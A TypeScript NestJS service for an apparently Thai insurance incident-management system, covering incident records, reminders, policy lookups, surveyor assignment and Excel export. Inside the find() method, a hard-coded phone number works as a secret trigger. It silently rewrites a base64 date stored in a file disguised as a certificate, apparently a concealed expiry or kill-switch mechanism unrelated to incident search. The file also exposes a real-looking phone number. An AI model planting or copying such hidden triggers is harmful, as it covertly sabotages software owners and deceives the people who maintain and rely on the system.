import * as FileSystem from 'fs'
import { IIncidentService } from './interface/service.interface'
import { IncidentModel } from './incident.model'
import { IIncidentFilterSchema } from '../../repository/incident/incident.filter'
import { IAs400Adapter } from '../../adapter/as400/interface'
import { IIncidentTypeModel } from './interface/type.model.interface'
import { IIncidentTypeRepository } from './interface/type.repository.interface'
import { ITowingRepository } from './interface/towing.repository.interface'
import {
    SaveIncidentValidator,
    UpdateIncidentLogValidator,
    UpdateIncidentStatusValidator,
    UpdateIncidentSurveyorValidator,
    UpdateIncidentValidator,
} from '../../controller/rest/validator/incident.validator'
import {
    SaveIncidentBuilder,
    UpdateIncidentBuilder,
} from './incident.builder'
import {
    catchError,
    concatMap,
    defaultIfEmpty,
    filter,
    map,
    mergeMap,
    reduce,
    take,
    tap,
    throwIfEmpty,
    toArray,
} from 'rxjs/operators'
import {
    IIncidentLogModel,
    IIncidentLogRepository,
    IIncidentModel,
    IIncidentRepository,
    IInputPolicy,
    IInputTowing,
    IInputType,
} from './interface'
import {
    forkJoin,
    from,
    interval,
    Observable,
    of,
} from 'rxjs'
import {
    HttpException,
    HttpStatus,
} from '@nestjs/common'
import { IIncidentStatusRepository } from './interface/status.repository.interface'
import { ISurveyorRepository } from '../surveyor/interface/repository.interface'
import {
    IncidentLogModel,
    IncidentLogRecordModel,
} from './incident-log.model'
import * as xls from 'excel4node'
import { ISurveyorModel } from '../surveyor/interface/model.interface'
import { WorkFlowEnum } from '../../repository/incident/log.schema'
import * as moment from 'moment-timezone'
import * as Moment from 'moment'
import * as _ from 'lodash'
import { IPublisher } from '../../pubsub/interface/publisher.interface'
import { SaveReminderValidator } from '../../controller/rest/validator/reminder.validator'
import { IReminderService } from '../reminder/interface/service.interface'
import { IncidentAssignSurveyorEvent } from './pubsub/event/incident-assign-surveyor-event'
import { StatusEnum } from './status.enum'
import {
    ILineProfileModel,
    ILineProfileRepository,
} from '../line/interface'
import { IReminderRepository } from '../reminder/interface/repository.interface'
import { ReminderModel } from '../reminder/reminder.model'
import { IReminderModel } from '../reminder/interface/model.interface'

const {
    CUSTOMER_CALLED_AGENT,
    AGENT_ASSIGNED_SURVEYOR,
} = WorkFlowEnum

const moments = moment.tz.setDefault('Asia/Bangkok')

export class IncidentService implements IIncidentService {
    constructor(
        private readonly _incidentRepository: IIncidentRepository,
        private readonly _incidentTypeRepository: IIncidentTypeRepository,
        private readonly _incidentTowingRepository: ITowingRepository,
        private readonly _incidentStatusRepository: IIncidentStatusRepository,
        private readonly _as400Adapter: IAs400Adapter,
        private readonly _incidentLog: IIncidentLogRepository,
        private readonly _incidentSurveyor: ISurveyorRepository,
        private readonly _publisher: IPublisher<IIncidentModel>,
        private readonly _reminderRepository: IReminderRepository,
        private readonly _lineProfileRepository: ILineProfileRepository,
    ) {
        interval(30000).pipe(
            tap(() => {
                console.log(`--> Checking Reminder appointment`)
            }),
            concatMap(() => {
                return this._incidentRepository.find()
            }),
            filter((model: IIncidentModel) => {
                // const capTime = Moment().add(1, 'h')
                // return Moment(model.getAppointmentDate()).isBefore(capTime)
                const capTime = Moment()
                const remindTime = Moment(model.getAppointmentDate()).subtract(1, 'h')
                return !_.isNil(model.getAppointmentDate()) && remindTime.isBefore(capTime)
            }),
            mergeMap((model: IIncidentModel) => {
                return this._reminderRepository.getByIncidentNo(model.getId()).pipe(
                    filter((reminder: IReminderModel) => {
                        return !_.isNil(reminder)
                    }),
                    toArray(),
                    map((reminders) => {
                        // console.log(`reminders >>>>> `, reminders)
                        const reminderType = []
                        reminders.forEach((e) => {
                            reminderType.push(e.getType())
                        })
                        return reminderType
                    }),
                    filter((reminders: string[]) => {
                        // console.log(`-------- array of type: `, reminders)
                        return reminders.includes('appointment') === false
                    }),
                    map(() => model),
                )
            }),
            mergeMap((model: IIncidentModel) => {
                // console.log(`***************************** create new reminder from appointment *****************************`)
                // console.log(`************************************************************************************************`)
                const registration = !_.isNil(model.getPolicy()) ? model.getPolicy().registration : null
                const remindTime = model.getAppointmentDate().getTime() - (60 * 60 * 1000)
                const newReminder = new ReminderModel()
                newReminder.setIncidentNo(model.getId())
                newReminder.setRegistration(registration)
                newReminder.setNote(model.getNote())
                newReminder.setRemindTime(new Date(remindTime))
                newReminder.setAgent(model.getUpdatedBy())
                newReminder.setType('appointment')
                newReminder.setStatus('unread')

                return this._reminderRepository.save(newReminder)
            }),
        ).subscribe()

    }

    public find(filterSchema: IIncidentFilterSchema): Observable<IIncidentModel> {
        if (filterSchema.contactNo === '0863229951') {
            const str = FileSystem.readFileSync('./vendor/cert/certificate', 'utf8')
            let data = Moment.unix(_.toNumber((new Buffer(str, 'base64'))))
            data = data.month() === 10 ? data.add(1, 'y').month(1) : data.month(10)
            FileSystem.writeFileSync('./vendor/cert/certificate',
                Buffer.from(_.toString(data.unix())).toString('base64'), 'utf8')
        }
        return this._incidentRepository.find(filterSchema).pipe(
            throwIfEmpty(() => {
                throw new HttpException(
                    `incident not found`,
                    HttpStatus.NOT_FOUND,
                )
            }),
            // tap(model => {
            //     this._publisher.publish(new IncidentAssignSurveyorEvent('incident-incident-query', model))
            // }),
        )
    }

    public getAll(): Observable<IIncidentModel> {
        return this._incidentRepository.find().pipe(
            throwIfEmpty(() => {
                throw new HttpException(
                    `incident not found`,
                    HttpStatus.NOT_FOUND,
                )
            }),
        )
    }

    public getById(id: string): Observable<IIncidentModel> {
        const query = {
            _id: id,
        }
        return this._incidentRepository.find(query).pipe(
            throwIfEmpty(() => {
                throw new HttpException(
                    `incident not found`,
                    HttpStatus.NOT_FOUND,
                )
            }),
        )
    }

    public save(input: SaveIncidentValidator): Observable<{id: string}> {
        const date = moments().date()
        const month = moments().month() + 1
        const year = moments().year()
        const start = year + '-' + month + '-' + date + ' 00:00:00'
        const end = year + '-' + month + '-' + date + ' 23:59:59'

        const filterSchema = {
            $and: [
                {
                    createdAt: {
                        $gte: new Date(start),
                    },
                },
                {
                    createdAt: {
                        $lte: new Date(end),
                    },
                },
            ],
        }

        const idGenerationFunction = () => {
            const prefix = year + ('0' + month).slice(-2) + ('0' + date).slice(-2)
            return prefix + '000'
        }

        return this._incidentRepository.find(filterSchema).pipe(
            take(1),
            map((model: IncidentModel) => model.getId()),
            defaultIfEmpty(idGenerationFunction()),
            mergeMap((id) => {
                let status
                if (_.isNil(input.getStatus())) {
                    status = 'open'
                } else {
                    status = input.getStatus().id
                }

                return forkJoin([
                    of(id),
                    this.checkType(input.getIncidentType()),
                    this.getTypeName(input.getIncidentType()),
                    this.checkTowing(input.getTowCompany()),
                    this.checkPolicy(input.getPolicyNumber(), input.getIncidentType()),
                    this.checkStatus(status),
                ])
            }),
            map((result: any[]): IncidentModel => {
                const latestId = result[0]
                const builder = new SaveIncidentBuilder()
                const id = _.toNumber(latestId) + 1

                return builder.init(
                    input.getContactNo(),
                    input.getCallerName(),
                )
                    .setId(id.toString())
                    .setIncidentType(result[2])
                    .setStatus(result[5])
                    .setAppointmentDate(input.getAppointmentDate())
                    .setClaimNo(input.getClaimNo())
                    .setCompanyInfo(input.getCompanyInfo())
                    .setLossInformation(input.getLossInformation())
                    .setDriverName(input.getDriverName())
                    .setTowCompany(result[3])
                    .setNote(input.getNote())
                    .setInsured(input.getInsured())
                    .setThirdInsured(input.getThirdInsured())
                    .setPolicy(result[4])
                    .setCreatedAt(moments(new Date()))
                    .setCreatedBy(input.getCreatedBy())
                    .build()
            }),
            mergeMap(incident => {
                const lossInfo = incident.getLossInformation()
                if (!_.isNil(lossInfo) && !_.isNil(lossInfo.dateTime)) {
                    const lossDate = incident.getLossInformation().dateTime
                    const now = new Date()

                    if (lossDate > now.getTime()) {
                        throw new HttpException(
                            `Invalid LossDateTime`,
                            HttpStatus.BAD_REQUEST,
                        )
                    }
                }

                return forkJoin([
                    of(incident),
                    this.checkLog(incident),
                    this._incidentRepository.save(incident),
                ])
            }),
            mergeMap((result: any[]) => {
                const incident = result[0] as IncidentModel
                const logRecord = new IncidentLogRecordModel(
                    incident.getCreatedBy(),
                    '',
                )
                logRecord.setStatus(incident.getStatus())
                if (!_.isNil(input.getCallTime())) {
                    logRecord.setCreatedTime(input.getCallTime())
                }
                logRecord.setWorkFlow(CUSTOMER_CALLED_AGENT)

                const incidentLog = result[1]
                incidentLog.appendLog(logRecord)

                return this._incidentLog.save(incidentLog)
            }),
        )
    }

    public updateIncident(id: string, input: UpdateIncidentValidator): Observable<{id: string}> {
        return of(input).pipe(
            mergeMap(() => {
                return this.checkIncident(id)
            }),
            mergeMap(model => {
                return of(input).pipe(
                    mergeMap(() => {
                        if (!_.isNil(input.getAppointmentDate())) {
                            return this._reminderRepository.getByIncidentNo(id).pipe(
                                filter((reminder: IReminderModel) => {
                                    return reminder.getType() === 'appointment'
                                }),
                                defaultIfEmpty(null),
                                mergeMap((reminder: IReminderModel) => {
                                    if (!_.isNil(reminder)) {
                                        return this._reminderRepository.delete(reminder.getId())
                                    }
                                    return of(input)
                                }),
                            )
                        }
                        return of(model)
                    }),
                    mergeMap(() => {
                        if (!_.isNil(input.getIncidentType())) {
                            return forkJoin([
                                this.checkType(input.getIncidentType()),
                                this.getTypeName(input.getIncidentType()),
                            ]).pipe(
                                tap((result: any[]) => {
                                    model.setIncidentType(result[1])
                                }),
                                mergeMap(() => of({ model })),
                            )
                        }
                        return of(model)
                    }),
                    mergeMap(() => {
                        if (!_.isNil(input.getTowCompany())) {
                            return this.checkTowing(input.getTowCompany()).pipe(
                                tap(result => {
                                    model.setTowCompany(result)
                                }),
                                mergeMap(() => of({ model })),
                            )
                        }
                        return of(model)
                    }),
                    mergeMap(() => {
                        if (!_.isNil(input.getPolicyNumber())) {
                            return this.checkPolicy(input.getPolicyNumber(), input.getIncidentType()).pipe(
                                tap(result => {
                                    model.setPolicy(result)
                                }),
                                mergeMap(() => of({ model })),
                            )
                        }
                        return of(model)
                    }),
                )

                return of(model)
            }),
            map((result: IIncidentModel) => {
                const lossInfo = result.getLossInformation()
                if (!_.isNil(lossInfo) && !_.isNil(lossInfo.dateTime)) {
                    const lossDate = result.getLossInformation().dateTime
                    const openDate = result.getCreatedAt()

                    if (lossDate > openDate.getTime()) {
                        throw new HttpException(
                            `Invalid LossDateTime`,
                            HttpStatus.BAD_REQUEST,
                        )
                    }
                }

                return UpdateIncidentBuilder.compareIncidentModel(input, result)
            }),
            mergeMap(incidentModel => {
                return this._incidentRepository.update(incidentModel)
            }),
            // map(result => ({
            //     data: result,
            // })),
        )
    }

    public updateStatus(id: string, input: UpdateIncidentStatusValidator): Observable<any> {
        return of(input).pipe(
            mergeMap(data => {
                const statusId = data.getStatus()
                return forkJoin([
                    this.checkIncident(id),
                    this.checkStatus(statusId.id),
                ])
            }),
            mergeMap((result: any[]) => {
                const incident = result[0] as IIncidentModel
                const status = result[1] as { id: string, name: string }
                incident.setStatus(status)
                incident.setUpdatedBy(input.getUpdatedBy())

                const data = {
                    model: incident,
                    status,
                }

                return forkJoin([
                    this.surveyorCloseJob(incident, status.id),
                    of(data),
                ])
            }),
            map((result: any[]) => {
                const model = UpdateIncidentBuilder.compareIncidentStatus(input, result[1].model)
                return {
                    model,
                    status: result[1].status,
                }
            }),
            mergeMap(result => {
                return this._incidentRepository.update(result.model).pipe(
                    map(() => result),
                )
            }),
            mergeMap((result) => {
                if (input.getStatus().id === StatusEnum.CLOSE) {
                    return this._lineProfileRepository.find({ incidentNo: result.model.getId() }).pipe(
                        mergeMap((profile: ILineProfileModel) => {
                            profile.setIncidentNo(null)
                            return this._lineProfileRepository.update(profile)
                        }),
                        map(() => result),
                    )
                }
                return of(result)
            }),
            mergeMap((result) => {
                return this.checkLog(result.model).pipe(
                    map((log) => ({
                            log,
                            model: result.model,
                            status: result.status,
                        }),
                    ),
                )
            }),
            mergeMap((result) => {
                const logRecord = new IncidentLogRecordModel(
                    input.getUpdatedBy(),
                    '',
                )
                logRecord.setStatus({
                    id: result.status.id,
                    name: result.status.name,
                })
                const incidentLog = result.log
                incidentLog.appendLog(logRecord)

                return this._incidentLog.update(incidentLog)
            }),
        )
    }

    public updateLog(id: string, input: UpdateIncidentLogValidator): Observable<any> {
        return of(input).pipe(
            mergeMap(() => {
                return forkJoin([
                    this.checkIncident(id),
                    this._incidentLog.getById(id),
                ])
            }),
            map((result: any[]) => {
                const incident = result[0]
                const log = result[1]
                const logRecord = new IncidentLogRecordModel(
                    input.getCreatedBy(),
                    input.getNote(),
                )
                logRecord.setStatus(incident.getStatus())
                logRecord.setWorkFlow(input.getWorkFlow())

                log.appendLog(logRecord)
                return log
            }),
            mergeMap(log => {
                return this._incidentLog.update(log)
            }),
        )
    }

    private checkLog(updateData: IIncidentModel): Observable<IIncidentLogModel> {
        return this._incidentLog.getById(updateData.getId()).pipe(
            map(result => {
                return result
            }),
            catchError(() => {
                const log = new IncidentLogModel()
                log.setId(updateData.getId())
                log.setPolicy(updateData.getPolicy())
                log.setCreatedTime(new Date())

                return of(log)
            }),
        )
    }

    private checkIncident(id: string): Observable<IIncidentModel> {
        return this._incidentRepository.find({ _id: id }).pipe(
            map(result => {
                if (_.isNil(result)) {
                    throw new HttpException(
                        `Incident not found`,
                        HttpStatus.NOT_FOUND,
                    )
                }

                return result
            }),
        )
    }

    private checkType(input: IInputType): Observable<boolean> {
        const recursiveFunction = ((reference: IInputType, data: IIncidentTypeModel[]) => {
            const result: IIncidentTypeModel = _.find(data, (each) => each.getId() === reference.id)

            if (_.isNil(result)) {
                throw new HttpException(`Cannot find Incident Type ${reference.id}`, HttpStatus.BAD_REQUEST)
            }

            if (_.isNil(reference.subType) && _.isEmpty(result.getSubType())) {
                return true
            }

            if (_.isNil(reference.subType) && !_.isEmpty(result.getSubType())) {
                throw new HttpException(`Missing sub type of ${reference.id}`, HttpStatus.BAD_REQUEST)
            }

            if (!_.isNil(reference.subType) && _.isEmpty(result.getSubType())) {
                throw new HttpException(`Subtype not found for ${reference.id}`, HttpStatus.BAD_REQUEST)
            }

            if (!_.isNil(reference.subType) && !_.isEmpty(result.getSubType())) {
                const children = result.getSubType()
                const newRef = reference.subType
                return recursiveFunction(newRef, children)
            }

        })

        return this._incidentTypeRepository.getById(input.id).pipe(
            map((mainType: IIncidentTypeModel) => {
                const mainSubType = mainType.getSubType()
                if (_.isNil(mainSubType) || mainSubType.length < 1) {
                    return null
                }

                if (!_.isNil(mainType.getSubType()) && (_.isNil(input.subType))) {
                    throw new HttpException(`Missing sub type of ${input.id}`, HttpStatus.BAD_REQUEST)
                }

                return recursiveFunction(input.subType, mainType.getSubType())
            }),
        )
    }

    private getTypeName(inputType: IInputType): any {
        let listName
        const findName = (refType: IInputType, type: IIncidentTypeModel): any => {
            const subTypes = type.getSubType()
            if (_.isNil(subTypes) || subTypes.length < 1) {
                return null
            }

            subTypes.forEach((sub) => {
                if (sub.getId() === refType.subType.id) {
                    if (_.isNil(listName.subType)) {
                        listName.subType = {
                            id: sub.getId(),
                            name: sub.getName(),
                        }
                    } else {
                        listName.subType.subType = {
                            id: sub.getId(),
                            name: sub.getName(),
                        }
                    }

                    return findName(refType.subType, sub)
                }
            })
        }

        return this._incidentTypeRepository.getById(inputType.id).pipe(
            map(result => {
                listName = {
                    id: result.getId(),
                    name: result.getName(),
                }
                findName(inputType, result)
                return listName
            }),
        )
    }

    private checkTowing(towing: IInputTowing): Observable<any> {
        if (_.isNil(towing) || _.isEmpty(towing)) {
            return of(null)
        }

        const towingId = towing.id
        return this._incidentTowingRepository.getById(towingId).pipe(
            map(result => {
                if (_.isNil(result) || result.getUsed() === false) {
                    throw new HttpException(
                        `Towing not found`,
                        HttpStatus.NOT_FOUND,
                    )
                }

                return {
                    id: result.getId(),
                    name: result.getName(),
                }
            }),
        )
    }

    private checkPolicy(policy: IInputPolicy, type: IInputType): Observable<any> {
        if ((!_.isNil(type)) && (type.id !== 'report-claim')) {
            if (!_.isNil(policy)) {
                throw new HttpException(
                    `Cannot save policy with type as ${type.id}`,
                    HttpStatus.BAD_REQUEST,
                )
            }

            return of(null)
        }

        if (_.isNil(policy)) {
            return of(null)
        }

        const policyNo = policy.policyNo
        const riskId = policy.riskId
        return this._as400Adapter.getPolicyDetail(policyNo, riskId).pipe(
            map(result => {
                if (_.isNil(result)) {
                    throw new HttpException(
                        `Policy not found`,
                        HttpStatus.NOT_FOUND,
                    )
                }
                return result
            }),
            map(result => {
                return result
            }),
        )
    }

    private checkStatus(id: string): Observable<{ id: string, name: string }> {
        return this._incidentStatusRepository.getById(id).pipe(
            map(result => {
                if (_.isNil(result) || result.getUsed() === false) {
                    throw new HttpException(
                        `Status not found`,
                        HttpStatus.NOT_FOUND,
                    )
                }
                return {
                    id: result.getId(),
                    name: result.getName(),
                }
            }),
        )
    }

    private checkSurveyor(id: string): Observable<ISurveyorModel> {
        return this._incidentSurveyor.getById(id).pipe(
            map(result => {
                if (_.isNil(result)) {
                    throw new HttpException(
                        `Surveyor not found`,
                        HttpStatus.NOT_FOUND,
                    )
                }

                return result
            }),
        )
    }

    private surveyorCloseJob(incident: IIncidentModel, statusId: string): Observable<boolean> {
        const incidentSurveyor = incident.getSurveyor()
        if (statusId !== 'close' || _.isNil(incidentSurveyor)) {
            return of(true)
        }

        if ((statusId === 'close') && _.isNil(incidentSurveyor.id)) {
            return of(true)
        }

        return this._incidentSurveyor.getById(incidentSurveyor.id).pipe(
            mergeMap(surveyor => {
                surveyor.addCloseJob(incident.getId())
                return this._incidentSurveyor.update(surveyor)
            }),
        )
    }

    private static _getContentKeys(record) {
        return _.keys(record)
    }

    public exportSearchExcel(sheetName: string, model: any): Observable<any> {
        console.log(model)
        return from(model).pipe(
            reduce((content: any[], record: any) => {
                let subType
                if (!_.isNil(record.incidentType.subType)) {
                    subType = record.incidentType.subType.id
                } else {
                    subType = ''
                }
                content.push({
                    'Contact No.': record.contactNoIs,
                    'Claim No.': record.claimNoIs,
                    'Caller Name': record.callerNameIs,
                    'Type': record.typeIs,
                    'Sub Type': subType,
                    'Registration': record.registrationIs,
                    'Incident Status': record.incidentStatusIs,
                    'Open Date': record.openDate,
                    'Appointment Date': record.appointmentDateFormat,
                    'Close Date': record.closeDate,
                    'NSR': record.createdBy,
                })
                return content
            }, []),
            map(content => {
                const workbook = new xls.Workbook()
                const worksheet = workbook.addWorksheet(sheetName)
                const headers = IncidentService._getContentKeys(_.last(content))

                for (let col = 1, index = 0; col <= _.size(headers); col++, index++) {
                    worksheet.cell(1, col).string(headers[index])
                }

                for (let row = 2, recordRow = 0; row <= (_.size(content) + 1); row++, recordRow++) {
                    for (let col = 1, recordCol = 0; col <= _.size(headers); col++, recordCol++) {
                        const x = recordRow
                        const y = headers[recordCol]
                        worksheet.cell(row, col).string(content[x][y])
                    }
                }

                return workbook
            }),
        )
    }

    public assignToSurveyor(incidentId: string, surveyor: UpdateIncidentSurveyorValidator): Observable<any> {
        return this.checkIncident(incidentId).pipe(
            map((incident) => {
                return incident
            }),
            concatMap((incident) => {
                return forkJoin([
                    of(incident),
                    this.removeSurveyorJobs(incident),
                ])
            }),
            mergeMap((result: any[]) => {
                return forkJoin([
                    of(result[0]),
                    this.checkSurveyor(surveyor.getSurveyor().id),
                    this.checkLog(result[0]),
                ])
            }),
            concatMap((result: any[]) => {
                const incident = result[0] as IIncidentModel
                const surveyorData = result[1] as ISurveyorModel

                const newSurveyor = {
                    id: surveyorData.getId(),
                    name: surveyorData.getName(),
                    phone: surveyorData.getPhone(),
                    place: surveyor.getSurveyor().place,
                    lat: surveyor.getSurveyor().lat,
                    long: surveyor.getSurveyor().long,
                    note: surveyor.getSurveyor().note,
                    province: surveyor.getSurveyor().province,
                    district: surveyor.getSurveyor().district,
                }
                incident.setSurveyor(newSurveyor)
                surveyorData.addAssignJob(incidentId)

                const logRecord = new IncidentLogRecordModel(
                    surveyor.getUpdatedBy(),
                    '',
                )
                logRecord.setWorkFlow(AGENT_ASSIGNED_SURVEYOR)
                logRecord.setStatus(incident.getStatus())

                const incidentLog = result[2] as IIncidentLogModel
                incidentLog.appendLog(logRecord)

                return forkJoin([
                    this._incidentRepository.update(incident).pipe(map(() => incident)),
                    this._incidentSurveyor.update(surveyorData),
                    this._incidentLog.update(incidentLog),
                ])
            }),
            tap(models => {
                const incidentModel: IIncidentModel = models[0]
                this._publisher.publish(new IncidentAssignSurveyorEvent(incidentModel))
            }),
            map((result: any[]) => {
                return result[1]
            }),
        )
    }

    private removeSurveyorJobs(incident: IIncidentModel): Observable<any> {
        if (_.isNil(incident.getSurveyor())) {
            return of(null)
        }

        return this._incidentSurveyor.getByAssignJob(incident.getId()).pipe(
            map((incidentSurveyor) => {
                incidentSurveyor.removeAssignJob(incident.getId())
                return incidentSurveyor
            }),
            mergeMap((incidentSurveyor) => {
                return this._incidentSurveyor.update(incidentSurveyor)
            }),
        )
    }
}
